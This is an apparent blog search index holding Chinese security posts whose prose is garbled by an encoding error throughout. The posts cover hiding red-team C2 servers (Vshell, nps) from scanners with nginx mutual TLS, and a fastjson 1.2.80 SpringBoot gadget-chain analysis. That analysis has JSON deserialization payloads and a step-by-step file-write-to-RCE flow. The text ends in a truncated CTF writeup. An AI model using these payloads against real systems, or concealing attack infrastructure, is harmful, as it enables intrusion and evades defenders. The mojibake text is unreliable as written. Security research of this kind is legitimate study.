<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>çº¢é˜Ÿå·¥å…·æŒ‡çº¹å¯¹æŠ—æªæ–½:nginxåŒå‘è®¤è¯</title>
      <link href="/2024/12/06/hong-dui-gong-ju-zhi-wen-dui-kang-cuo-shi/"/>
      <url>/2024/12/06/hong-dui-gong-ju-zhi-wen-dui-kang-cuo-shi/</url>
      
        <content type="html"><![CDATA[<h3 id="èµ·å› "><a href="#èµ·å› " class="headerlink" title="èµ·å› "></a>èµ·å› </h3><p>æœ€è¿‘VPSè¢«æˆ‘å›½å°äº†ï¼Œæ€æ¥æƒ³å»åº”è¯¥æ˜¯å‰æ®µæ—¶é—´åœ¨æœåŠ¡å™¨æ­äº†Vshellå’Œnpså¿˜è®°å…³äº†ï¼Œè™½ç„¶éƒ½æ”¹äº†ç«¯å£ä½†é•¿æœŸæ”¾åœ¨å…¬ç½‘ä¸Šè¿˜æ˜¯è¢«æ‰«åˆ°äº†ã€‚åº”è¯¥ä¸æ˜¯æœåŠ¡å•†æŸ¥æ€ç—…æ¯’çš„é—®é¢˜ï¼Œæ¯•ç«Ÿåœ¨æ§åˆ¶å°è¿˜æ˜¯èƒ½æ­£å¸¸ç™»é™†VPSçš„ã€‚</p><h3 id="å¯¹æŠ—æªæ–½"><a href="#å¯¹æŠ—æªæ–½" class="headerlink" title="å¯¹æŠ—æªæ–½"></a>å¯¹æŠ—æªæ–½</h3><p>å¹³å¸¸ä¼šæ”¾åœ¨å…¬ç½‘çš„æœåŠ¡ä¸€èˆ¬éƒ½æ˜¯httpæœåŠ¡ï¼Œæ—¢ç„¶æ˜¯httpæœåŠ¡çš„è¯é‚£ä¹ˆå°±åŠ ä¸ªnginxåå‘ä»£ç†ï¼Œåœ¨åå‘ä»£ç†ä¸­é…ç½®å¹¶è¿‡æ»¤æ‰æ‰«æè¯·æ±‚å³å¯ã€‚</p><p><a href="https://127.0.0.1:xxxæ˜¯VPSèµ·çš„æœåŠ¡ï¼ˆæ³¨æ„åªç›‘å¬127.0.0.1ï¼‰ï¼Œnginxç”¨proxy_passè½¬å‘è¯·æ±‚è¿‡å»å°±å®Œäº‹äº†ã€‚">https://127.0.0.1:xxxæ˜¯VPSèµ·çš„æœåŠ¡ï¼ˆæ³¨æ„åªç›‘å¬127.0.0.1ï¼‰ï¼Œnginxç”¨proxy_passè½¬å‘è¯·æ±‚è¿‡å»å°±å®Œäº‹äº†ã€‚</a></p><pre><code>server &#123;    listen xxx; # ç›‘å¬ç«¯å£    server_name xxx; # æœåŠ¡åç§°    location / &#123;        proxy_pass https://127.0.0.1:xxx;         proxy_set_header Host $host;        proxy_set_header X-Real-IP $remote_addr;        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;            &#125;&#125;</code></pre><p>å¯¹æŠ—æŒ‡çº¹æ‰«æè¿™ç§éœ€æ±‚å½“ç„¶æ˜¯åŠ ç™½åå•äº†ï¼Œæ¯•ç«Ÿå’±éƒ½ä¸æ¸…æ¥šè¦é¢å¯¹çš„é»‘è‰²åŠ¿åŠ›æœ‰å¤šä¹ˆææ€–ã€‚</p><h4 id="ç™½åå•IP"><a href="#ç™½åå•IP" class="headerlink" title="ç™½åå•IP"></a>ç™½åå•IP</h4><p>åŠ ç™½IPçš„è¯åœ¨serverå—ä¸­åŠ å…¥allowå°±è¡Œäº†ï¼Œé—®é¢˜æ˜¯å®¢æˆ·ç«¯IPæ€»æ˜¯ä¼šå˜ã€‚é™¤éè¿˜æœ‰ä¸€å°VPS Båšæˆè·³æ¿ï¼Œä»¥åè®¿é—®VPS A(è·‘å·¥å…·çš„VPS)å‡èµ°VPS Bçš„æµé‡ï¼Œä½†æ˜¾ç„¶æˆ‘æ²¡æœ‰ç¬¬äºŒå°VPSã€‚</p><pre><code>allow 1.1.1.1;deny all;</code></pre><h4 id="è¯·æ±‚å¤´æ ¡éªŒ"><a href="#è¯·æ±‚å¤´æ ¡éªŒ" class="headerlink" title="è¯·æ±‚å¤´æ ¡éªŒ"></a>è¯·æ±‚å¤´æ ¡éªŒ</h4><p>é™åˆ¶æ¯æ¬¡è®¿é—®å¿…é¡»åŠ ä¸Šè¯·æ±‚å¤´X-Auth-Token:Squirt1e æ‰å¯è®¿é—®æœåŠ¡ï¼Œä½†é—®é¢˜æ˜¯åƒç‚¹å‡»ç™»å½•ç»™ä¸ªæœåŠ¡é‚£è¾¹ç»™ä¸ª302æˆ–è€…åŠ è½½jsæ˜¯ä¸ä¼šå¸¦ä¸Šheadersçš„ï¼Œè¦è¿™ä¹ˆæçš„è¯è¿˜å¾—æ”¹å·¥å…·çš„ä»£ç å¤ªéº»çƒ¦äº†ã€‚</p><pre><code>location / &#123;    # æ£€æŸ¥è¯·æ±‚å¤´ X-Auth-Token çš„å€¼    if ($http_x_auth_token != &quot;Squirt1e&quot;) &#123;        return 404; # å¦‚æœä¸åŒ¹é…ï¼Œè¿”å› 404    &#125;    proxy_pass https://127.0.0.1:19003;    proxy_set_header Host $host;    proxy_set_header X-Real-IP $remote_addr;    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;&#125;</code></pre><h4 id="HTTPSåŒå‘è®¤è¯"><a href="#HTTPSåŒå‘è®¤è¯" class="headerlink" title="HTTPSåŒå‘è®¤è¯"></a>HTTPSåŒå‘è®¤è¯</h4><p>æœ€å¥½çš„åŠæ³•åº”è¯¥å°±æ˜¯åŒå‘è®¤è¯äº†ï¼Œé…ç½®nginxè®¤è¯å®¢æˆ·ç«¯å³å¯ã€‚</p><p>é¦–å…ˆè¦ç”Ÿæˆcaå’Œå®¢æˆ·ç«¯è¯ä¹¦ï¼š</p><pre><code># ca certopenssl genrsa -out ca.key 2048openssl req -x509 -new -nodes -key ca.key -sha256 -days 3650 -out ca.crt# clientopenssl genrsa -out client.key 2048openssl req -new -key client.key -out client.csr# client.certopenssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt -days 3650 -sha256</code></pre><p>é‡ç‚¹æ˜¯é…ç½®å¥½å®¢æˆ·ç«¯è¯ä¹¦ï¼Œå¹¶ä¸”ç¡®ä¿ssl_verify_clienté€‰é¡¹æ˜¯æ‰“å¼€çš„</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20241206211813426.png" alt="image-20241206211813426"></p><p>é‡å¯nginxï¼Œè¿™æ ·å°±å¿…é¡»è®¤è¯æ‰èƒ½çœ‹åˆ°æœåŠ¡äº†ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20241206212007060.png" alt="image-20241206212007060"></p><p>æµè§ˆå™¨å¯¼å…¥è¯ä¹¦çš„è¯æœ€å¥½è½¬æˆpkcsæ ¼å¼ï¼š</p><pre><code>openssl pkcs12 -export -in client.crt -inkey client.key -out client.p12 -name &quot;client&quot;</code></pre><p>ç„¶åå¯¼å…¥ä¸ªäººè¯ä¹¦å³å¯ä½¿ç”¨ï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20241206212702538.png" alt="image-20241206212702538"></p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson 1.2.80 SpringBoot æ–°é“¾</title>
      <link href="/2024/11/08/fastjson-1.2.80-springboot-xin-lian/"/>
      <url>/2024/11/08/fastjson-1.2.80-springboot-xin-lian/</url>
      
        <content type="html"><![CDATA[<blockquote><p>geekcon2024 jsjcwå¸ˆå‚…æŠ«éœ²çš„fastjson 1.2.80åœ¨springä¸‹çš„RCEåˆ©ç”¨æœ‰å¾ˆå¤šå€¼å¾—å­¦ä¹ çš„åœ°æ–¹ã€‚è¿™ä¹ˆçœ‹å»å¹´å‡ºçš„elephantcmsåˆå¤šäº†ä¸€ä¸ªéé¢„æœŸï¼Œä¸è¿‡è¿™ä¸ªéé¢„æœŸæ¯”é¢„æœŸè§£è¿˜éš¾ğŸ˜“</p></blockquote><h4 id="é—®é¢˜1ï¼šç¼“å­˜InputStream"><a href="#é—®é¢˜1ï¼šç¼“å­˜InputStream" class="headerlink" title="é—®é¢˜1ï¼šç¼“å­˜InputStream"></a>é—®é¢˜1ï¼šç¼“å­˜InputStream</h4><h5 id="æ€ä¹ˆç¼“å­˜InputStream"><a href="#æ€ä¹ˆç¼“å­˜InputStream" class="headerlink" title="æ€ä¹ˆç¼“å­˜InputStream"></a>æ€ä¹ˆç¼“å­˜InputStream</h5><p><code>1.2.68</code>çš„ä¿®å¤æ–¹å¼å°†<code>java.lang.Runnable</code>ã€<code>java.lang.Readable</code>å’Œ<code>java.lang.AutoCloseable</code>åŠ å…¥äº†é»‘åå•ã€‚åœ¨<code>1.2.80</code>çš„å¸¸è§åˆ©ç”¨ä¸­ç”¨åˆ°çš„æœŸæœ›ç±»ä¸ºï¼š<code>Throwable</code>å’Œ<code>Exception</code>ï¼Œè€Œæœ¬æ¬¡<code>gadget</code>ç”¨åˆ°çš„æ˜¯<code>Exception</code>ã€‚</p><p>å­¦ä¹ æœ¬æ¬¡æŒ–æ˜<code>gadget</code>éœ€äº†è§£å…³é”®ç‰¹æ€§1ï¼š<strong>fastjsonååºåˆ—åŒ–ç¬¦åˆæ¡ä»¶çš„æœŸæœ›ç±»æ—¶ï¼Œä¼šå°†<code>setter</code>å‚æ•°ã€<code>public</code>å­—æ®µã€æ„é€ å‡½æ•°å‚æ•°åŠ åˆ°ç¼“å­˜ä¸­</strong>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1731045004757.png" alt="1731045004757"></p><p>æˆ‘ä»¬å…ˆå‘ä¸€ä¸ªç®€å•çš„<code>payload</code>çœ‹çœ‹<code>fastjson</code>æ˜¯æ€ä¹ˆç¼“å­˜æ–°ç±»çš„ï¼š</p><pre><code>&#123;&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;com.fasterxml.jackson.core.exc.InputCoercionException&quot;&#125;</code></pre><p>è·Ÿè¿›åˆ°<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</code>ï¼š</p><pre><code>checkAutoType:1444, ParserConfig (com.alibaba.fastjson.parser)parseObject:343, DefaultJSONParser (com.alibaba.fastjson.parser)parse:1430, DefaultJSONParser (com.alibaba.fastjson.parser)parse:1390, DefaultJSONParser (com.alibaba.fastjson.parser)parse:181, JSON (com.alibaba.fastjson)parse:155, JSON (com.alibaba.fastjson)getPropertyValue:3850, JSONPath (com.alibaba.fastjson)eval:2354, JSONPath$PropertySegment (com.alibaba.fastjson)eval:121, JSONPath (com.alibaba.fastjson)handleResovleTask:1599, DefaultJSONParser (com.alibaba.fastjson.parser)parse:183, JSON (com.alibaba.fastjson)parse:191, JSON (com.alibaba.fastjson)parse:147, JSON (com.alibaba.fastjson)vuln:12, JSONController (org.example.controller)</code></pre><p>å‘ç°è¿™é‡Œä»<code>Mapping</code>ç¼“å­˜å–åˆ°äº†<code>Exception</code>æœŸæœ›ç±»ï¼š<img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20241108140145092.png" alt="image-20241108140145092"></p><p>å¯ä»¥çœ‹åˆ°åœ¨<code>TypeUtils</code>çš„<code>static</code>ä¸­ï¼ˆä¹Ÿå°±æ˜¯åˆå§‹åŒ–ï¼‰è°ƒç”¨<code>addBaseClassMappings</code>å¾€<code>mappings</code>ç¼“å­˜ä¸­æ·»åŠ äº†<code>Exception</code>ç­‰æœŸæœ›ç±»ï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20241108140413822.png" alt="image-20241108140413822"></p><p>åœ¨æ‹¿åˆ°å¯¹åº”çš„<code>Exception</code>ç±»åè¯¥æ¢å¤å­—æ®µä¿¡æ¯äº†ï¼Œè¿™é‡Œæˆ‘ä»¬çš„å­—æ®µæ˜¯ç‰¹æ®Šçš„<code>@type</code>ã€‚é¦–å…ˆ<code>fj</code>æ‰¾åˆ°<code>Exception</code>å¯¹åº”çš„ååºåˆ—åŒ–å™¨<code>ThrowableDeserializer</code>ï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1731047938347.png" alt="1731047938347"></p><p>åç»­ä¼šèµ°åˆ°<code>ThrowableDeserializer#deserialize</code>ï¼Œæ³¨æ„è¿™é‡Œä¼ äº†æœŸæœ›ç±»ï¼ˆThrowable.classï¼‰ï¼š</p><pre><code>exClass = parser.getConfig().checkAutoType(exClassName, Throwable.class, lexer.getFeatures());</code></pre><p>å› æ­¤åœ¨<code>loadclass</code>åä¼šæŠŠ<code>com.fasterxml.jackson.core.exc.InputCoercionException</code>åŠ åˆ°ç¼“å­˜ï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1731049413307.png" alt="1731049413307"></p><p>okï¼Œå‘é€å¦‚ä¸‹<code>payload</code>ï¼š</p><pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Exception"</span><span class="token punctuation">,</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.fasterxml.jackson.core.exc.InputCoercionException"</span><span class="token punctuation">,</span><span class="token property">"p"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨æ‹¿åˆ°ååºåˆ—åŒ–å™¨å¹¶ä¸”æ¢å¤å®Œ<code>InputCoercionException</code>åï¼Œåé¢ç”¨ååºåˆ—åŒ–å™¨æ‹¿åˆ°å¯¹åº”å­—æ®µå¹¶æ ¹æ®<code>key</code>å®ä¾‹åŒ–<code>FieldDeserializer</code>ã€‚è¿™é‡Œ<code>fileldInfo</code>çš„<code>class</code>æ˜¯<code>JsonParser</code>ï¼Œå› ä¸ºæˆ‘ä»¬çš„<code>value</code>æ˜¯ä¸ª<code>jsonobject</code>å› æ­¤è°ƒç”¨<code>cast</code>è¿›è¡Œç±»å‹è½¬æ¢ï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1731050042273.png" alt="1731050042273"></p><p>è¿™ä¸ªå‡½æ•°ä¼šæ ¹æ®ä¼ å…¥å¯¹è±¡çš„ç±»å‹æ¥è¿›è¡Œå¯¹åº”çš„ç±»å‹è½¬æ¢ï¼Œä¼ å…¥çš„æ˜¯<code>p</code>ä¼šèµ°åˆ°<code>Map</code>çš„ç±»å‹è½¬æ¢ï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1731050469063.png" alt="1731050469063"></p><p>æ³¨æ„è¿™é‡Œæ‹¿äº†<code>com.fasterxml.jackson.core.JsonParser</code>çš„ååºåˆ—åŒ–å™¨ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20241108152301963.png" alt="image-20241108152301963"></p><p>è°ƒç”¨<code>putDeserializer</code>å‡½æ•°<code>this.deserializers.put(type, deserializer)</code>ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨æ‹¿åˆ°æ„é€ å‡½æ•°å­—æ®µçš„ååºåˆ—åŒ–å™¨çš„åŒæ—¶è¿˜ä¼šå¾€ç¼“å­˜é‡Œæ”¾<code>type</code>å’Œååºåˆ—åŒ–å™¨ã€‚</p><pre><code>this.deserializers.put(type, deserializer);</code></pre><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20241108153606397.png" alt="image-20241108153606397"></p><p>å¥½å¥½å¥½ï¼Œæ¥ä¸‹æ¥å‘é€:</p><pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"a"</span><span class="token operator">:</span> <span class="token property">"{    \"@type\": \"java.lang.Exception\",    \"@type\": \"com.fasterxml.jackson.core.exc.InputCoercionException\",    \"p\"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>"<span class="token punctuation">,</span>  <span class="token property">"b"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"$.a.a"</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"c"</span><span class="token operator">:</span> <span class="token property">"{  \"@type\": \"com.fasterxml.jackson.core.JsonParser\",  \"@type\": \"com.fasterxml.jackson.core.json.UTF8StreamJsonParser\",  \"in\"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span>"<span class="token punctuation">,</span>  <span class="token property">"d"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"$.c.c"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è€Œåç»­åœ¨ååºåˆ—åŒ–<code>JsonParser</code>ç±»è¿‡ç¨‹ä¸­èµ°<code>checkAutoType</code>å°±èƒ½å–åˆ°è¿™ä¸ªç±»äº†ï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20241108154008903.png" alt="image-20241108154008903"></p><p>å¯¹<code>UTF8StreamJsonParser</code>æ¥è¯´ä»–æ˜¯<code>JsonParser</code>ä¸€ä¸ªç‰¹æ®Š<code>field</code>ï¼Œæƒ…å†µå’Œ<code>InputCoercionException</code>ä¹‹äº<code>Exception</code>ç›¸ä¼¼ï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20241108154441468.png">åœ¨<code>loadClass</code>è¯¥ç±»åè¿˜æ˜¯èµ°è¿™ä¸ªæ·»åŠ ç¼“å­˜é€»è¾‘ï¼š</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    TypeUtils<span class="token punctuation">.</span><span class="token function">addMapping</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è€Œåˆå› ä¸º<code>InputStream</code>æ˜¯<code>UTF8StreamJsonParser</code>çš„æ„é€ å‚æ•°å› æ­¤ä¸å†èµ˜è¿°ï¼Œä¸ä¸Šè¿°<code>InputCoercionException</code>ä¹‹äº<code>JsonParser</code>çš„æƒ…å†µç±»ä¼¼ã€‚</p><p>PSï¼šç¿»äº†ç¿»å®ç°<code>JsonParser</code>çš„ç±»å‘ç°ç¡®å®åªæœ‰<code>UTF8StreamJsonParser</code>çš„æ„é€ å‚æ•°å­˜åœ¨<code>InputStream</code>ï¼Œå› æ­¤æƒ³æ‰¾æ–°é“¾çš„è¯åªèƒ½ä»<code>InputCoercionException</code>ç”šè‡³æ›´å¾€å‰æ‰¾äº†:)</p><p>æ•´ä½“<code>gadget</code>é€»è¾‘ä½œè€…å†™çš„éå¸¸æ¸…æ™°ï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1731052436591.png" alt="1731052436591"></p><h5 id="ä¸ºä»€ä¹ˆç¼“å­˜InputStream"><a href="#ä¸ºä»€ä¹ˆç¼“å­˜InputStream" class="headerlink" title="ä¸ºä»€ä¹ˆç¼“å­˜InputStream"></a>ä¸ºä»€ä¹ˆç¼“å­˜InputStream</h5><p>å› ä¸ºåœ¨<code>1.2.80 fastjson</code>ç¦äº†<code>AutoCloseable</code>ï¼Œè€Œ<code>BH</code>ä¹‹å‰çˆ†å‡ºæ¥çš„é€å­—èŠ‚è¯»æ–‡ä»¶çš„åˆ©ç”¨ç±»<code>BOMInputStream</code>ç»§æ‰¿äº†<code>InputStream</code>ï¼Œå› æ­¤æ‹¿<code>InputStream</code>å°±æ˜¯ä¸ºäº†å®ç°ä»»æ„æ–‡ä»¶è¯»ã€‚</p><p>è¿™é‡Œåˆç†æ¨æµ‹ä½œè€…æ˜¯çœ‹åˆ°è¿™ä¸ª<code>poc</code>å¼€å§‹æŒ–æ˜<code>gadget</code>çš„ã€‚å› ä¸º<code>AutoCloseable</code>è¢«<code>ban</code>é€€è€Œæ±‚å…¶æ¬¡æ‰¾<code>InputStream</code>ï¼Œç»“åˆ<code>fastjson</code>ç¼“å­˜æ–°ç±»çš„ç‰¹æ€§æ‰¾åˆ°äº†å¾€ç¼“å­˜é‡Œå¡<code>InputStream</code>çš„<code>gadget</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20241108160540367.png" alt="image-20241108160540367"></p><p>å…³äºä»»æ„æ–‡ä»¶å†™ï¼Œä½œè€…åº”è¯¥æ˜¯æ‰¾åˆ°äº†ä¸€ä¸ªå…¨æ–°çš„é“¾å­è§£å†³äº†å¿…é¡»<code>8192</code>å­—èŠ‚çš„é—®é¢˜ï¼Œè†œï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1731053582658.png" alt="1731053582658"></p><p>ä¸è¿‡è¯è¯´å›æ¥ä¹‹å‰çœ‹è¿‡ä¸€ä¸ª<code>fj</code>ç»•<code>WAF</code>æ‰“ä»»æ„æ–‡ä»¶å†™çš„<code>ctf</code>é¢˜ï¼Œé‚£é“é¢˜æœ€åé™åˆ¶äº†å­—ç¬¦é•¿åº¦ï¼Œæ‰“<code>8192</code>å­—èŠ‚é‚£æ¡<code>gadget</code>ä¼šè¢«<code>ban</code>ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æƒ³è€ƒè¿™æ¡é“¾å­ï¼Ÿ</p><h4 id="é—®é¢˜2ï¼šSpringBoot-ä»»æ„æ–‡ä»¶å†™-to-RCEï¼Ÿ"><a href="#é—®é¢˜2ï¼šSpringBoot-ä»»æ„æ–‡ä»¶å†™-to-RCEï¼Ÿ" class="headerlink" title="é—®é¢˜2ï¼šSpringBoot ä»»æ„æ–‡ä»¶å†™ to RCEï¼Ÿ"></a>é—®é¢˜2ï¼šSpringBoot ä»»æ„æ–‡ä»¶å†™ to RCEï¼Ÿ</h4><p>å°½ç®¡ä¹‹å‰æœ‰å¸ˆå‚…æå‡ºäº†å†™<code>charset.jar</code>å®ç°<code>RCE</code>çš„æ€è·¯ï¼Œä½†æœ¬äººä»æœªå¤ç°æˆåŠŸè¿‡ï¼ˆä¸æ˜¯æ²¡æƒé™å°±æ˜¯å­˜åœ¨ç±»åŠ è½½é—®é¢˜ï¼‰ã€‚è¿™é‡Œä½œè€…ç»™äº†ä¸€ä¸ªæ–°çš„æ€è·¯åŒæ ·å¾ˆå€¼å¾—å­¦ä¹ ã€‚</p><p><code>fastjson</code>åœ¨ç±»åŠ è½½æ—¶é€šè¿‡<code>TomcatEmbeddedWebappClassLoader</code>ç±»åŠ è½½å™¨åŠ è½½ç±»ï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20241108163540689.png" alt="image-20241108163540689"></p><p>æ ¹æ®åŒäº²å§”æ´¾æœºåˆ¶æœ‰äº›ç±»ä¼šè®©<code>WebappClassLoaderBase</code>æ¥åŠ è½½ã€‚è€Œ<code>WebappClassLoaderBase#findClass</code>è¿™é‡Œç«Ÿç„¶æœ‰ä¸ªåŠ è½½å†…éƒ¨ç±»çš„é€»è¾‘ï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20241108164104953.png" alt="image-20241108164104953"></p><p>çœ‹ä¸€ä¸‹ç±»åŠ è½½è·¯å¾„ï¼Œå±…ç„¶åœ¨<code>temp</code>ç›®å½•ä¸‹æœ‰ä¸ªæ–°çš„ç±»åŠ è½½å£å­ï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20241108164546664.png" alt="image-20241108164546664"></p><p>è€Œåœ¨<code>linux</code>ä¸‹<code>docbase</code>çš„è·¯å¾„åœ¨<code>/tmp</code>ï¼Œå› æ­¤å¾€<code>docbase</code>è·¯å¾„ä¸‹å†™ç±»å°±å¯ä»¥æ‰“ç±»åŠ è½½äº†ï¼Œè€Œè¯¥è·¯å¾„å¯ä»¥é€šè¿‡è·¯å¾„éå†æˆ–ä»»æ„æ–‡ä»¶è¯»å–å¾—åˆ°ã€‚ä¸è¿‡è¯è¯´å›æ¥åœ¨åº”ç”¨é‡å¯æ—¶åˆä¼šå‡ºç°æ–°çš„<code>docbase</code>ï¼Œå›¾çœäº‹çš„è¯æˆ‘ä»¬å…¨éƒ½æ‰“ä¸€éã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1731055641321.png" alt="1731055641321"></p><h4 id="linuxæ”»å‡»æµç¨‹"><a href="#linuxæ”»å‡»æµç¨‹" class="headerlink" title="linuxæ”»å‡»æµç¨‹"></a>linuxæ”»å‡»æµç¨‹</h4><ol><li>å°†<code>InputStream</code>æ”¾å…¥<code>fastjson</code>ç¼“å­˜</li><li>è¯»å–<code>/tmp</code>æ–‡ä»¶ä¸‹çš„æ–‡ä»¶ï¼Œæ‰¾åˆ°<code>docbase</code>çš„æ–‡ä»¶åã€‚</li><li>å¾€<code>$&#123;docbase&#125;/WEB-INF/classes/</code>è·¯å¾„ä¸‹å†™å…¥æ¶æ„ç±»</li><li>é€šè¿‡<code>fastjson</code>è§¦å‘ç±»åŠ è½½ã€‚</li></ol><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><ol><li><a href="https://www.geekcon.top/js/pdfjs/web/viewer.html?file=/doc/ppt/GC24_SpringBoot%E4%B9%8B%E6%AE%87.pdf">https://www.geekcon.top/js/pdfjs/web/viewer.html?file=/doc/ppt/GC24_SpringBoot%E4%B9%8B%E6%AE%87.pdf</a></li><li><a href="https://github.com/luelueking/CVE-2022-25845-In-Spring">https://github.com/luelueking/CVE-2022-25845-In-Spring</a></li><li><a href="https://y4er.com/posts/fastjson-1.2.80/#%E5%9B%9E%E9%A1%BEfastjson%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E">https://y4er.com/posts/fastjson-1.2.80/#%E5%9B%9E%E9%A1%BEfastjson%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç ”ç©¶ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVAå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>R3CTF r3gallery é¢˜è§£</title>
      <link href="/2024/06/24/2-r3ctf-r3gallery-ti-jie/"/>
      <url>/2024/06/24/2-r3ctf-r3gallery-ti-jie/</url>
      
        <content type="html"><![CDATA[<p>æœ¬é¢˜è€ƒç‚¹å¦‚ä¸‹ï¼š</p><ol><li><code>canonicalPath</code>è·¯å¾„ç©¿è¶Šã€<code>file://</code>å‰ç¼€<code>ftp</code>åè®®åˆ©ç”¨</li><li>ååºåˆ—åŒ–è§¦å‘<code>getConnection</code></li><li><code>derby-client jdbc</code>ä»»æ„æ–‡ä»¶å†™å…¥</li></ol><p>æ¯”èµ›çš„æ—¶å€™å¡åœ¨ä¸€ä¸ªå¾ˆè ¢çš„é—®é¢˜ä¸Š-.-æœ‰ç‚¹å¯æƒœã€‚</p><h4 id="canonicalPathè·¯å¾„ç©¿è¶Šã€file-x2F-x2F-å‰ç¼€ftpåè®®åˆ©ç”¨"><a href="#canonicalPathè·¯å¾„ç©¿è¶Šã€file-x2F-x2F-å‰ç¼€ftpåè®®åˆ©ç”¨" class="headerlink" title="canonicalPathè·¯å¾„ç©¿è¶Šã€file:&#x2F;&#x2F;å‰ç¼€ftpåè®®åˆ©ç”¨"></a>canonicalPathè·¯å¾„ç©¿è¶Šã€file:&#x2F;&#x2F;å‰ç¼€ftpåè®®åˆ©ç”¨</h4><p><code>/api/decompress</code>æ¥å£ä¼šè¯»ä¸€ä¸ªæŒ‡å®šçš„æ–‡ä»¶ï¼Œä¸è¿‡æœ‰<code>file:///heavy_images/</code>å‰ç¼€é™åˆ¶ã€‚è¯»å®Œæ–‡ä»¶å†…å®¹åä¼šèµ°åŸç”Ÿååºåˆ—åŒ–ã€‚</p><pre class="line-numbers language-Java"><code class="language-Java">String processedPath = PathUtils.canonicalPath("file:///heavy_images/" + path);if (processedPath == null || !processedPath.startsWith("file://")) {    return "Invalid".getBytes(StandardCharsets.UTF_8);}FileUrlResource fileUrlResource = new FileUrlResource(new URL(processedPath));ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(fileUrlResource.getInputStream().readAllBytes());InputStream is = new GZIPInputStream(byteArrayInputStream);ObjectInputStream sois = new ObjectInputStream(is);ImageBean image = (ImageBean)sois.readObject();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ€è·¯ä¸€æ˜¯åˆ©ç”¨<code>tomcat</code>ç¼“å­˜ä¸´æ—¶ä¸Šä¼ æ–‡ä»¶çš„ç‰¹æ€§ï¼Œé€šè¿‡ä¸€è¾¹ä¸Šä¼ 